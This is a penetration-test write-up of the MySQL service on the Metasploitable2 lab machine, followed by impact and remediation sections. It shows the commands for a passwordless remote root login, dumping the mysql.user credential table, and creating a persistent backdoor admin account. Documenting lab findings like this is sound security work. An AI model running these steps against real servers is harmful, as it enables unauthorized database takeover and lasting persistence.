# ✅ MySQL Service Exploitation (Port 3306)

## 🔹 Overview
During the assessment of the Metasploitable2 target, the MySQL service running on port **3306** was identified as critically misconfigured. The database server allows **remote authentication as `root` without a password**, enabling full control of all databases and the ability to create persistent backdoor accounts.

---

## 🔹 1. Service Enumeration

### ✅ Port Scan
```bash
nmap -p3306 -sV 192.168.56.101

Result:

    Service: MySQL

    Version: 5.0.51a-3ubuntu5

    Remote connections: Enabled

    SSL/TLS: Not enforced

This version is outdated and lacks modern security mechanisms.
🔹 2. Remote Login Without Password

Initial login attempts failed due to SSL negotiation errors. However, disabling SSL allowed access:

mysql -h 192.168.56.101 -u root --skip-ssl

✅ Login was successful without a password, confirming a critical authentication vulnerability.
🔹 3. Database Enumeration

Once authenticated, all databases on the server were accessible:

SHOW DATABASES;

Discovered Databases:

    information_schema

    dvwa

    metasploit

    mysql

    owasp10

    tikiwiki

    tikiwiki195

These contain potentially sensitive application data and credentials.
🔹 4. User Enumeration & Privileges

SELECT host, user, password FROM mysql.user;

Key Findings:

    root@% exists with no password.

    Host % means login is allowed from any remote IP.

    A guest account (guest@%) is also present.

Privilege inspection confirmed full access:

SHOW GRANTS FOR 'root'@'%';

Result:

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION

✅ The attacker has unrestricted control over every database.
🔹 5. Persistence Through Backdoor Account

To demonstrate impact, a new attacker-controlled user was created:

CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned123';
GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

✅ This provides a long-term foothold, even if the root account is later secured.
🔹 6. Exploitation Notes

    Modern Metasploit no longer includes the mysql_udf_payload module, so direct RCE via UDF was not available.

    However, the level of access achieved already qualifies as full system compromise from a data security perspective.

🔹 7. Impact Assessment

Severity: Critical

An attacker can:

    Access, modify, or delete all data

    Extract credentials stored in application databases

    Create privileged accounts

    Compromise connected applications (DVWA, TikiWiki, etc.)

    Potentially pivot to system-level exploitation

This represents a total breach of database confidentiality, integrity, and availability.
🔹 8. Recommended Remediation

    Set a strong password for all MySQL accounts

    Remove root@% remote login

    Disable remote access unless required

    Enforce SSL/TLS

    Update MySQL to a supported version

    Remove unused accounts such as guest

✅ Conclusion

MySQL on port 3306 was found to be critically vulnerable due to an unauthenticated remote root login, lack of password enforcement, and unrestricted privileges. This misconfiguration allows complete database takeover and long-term persistence, making it one of the most severe findings in the assessment.
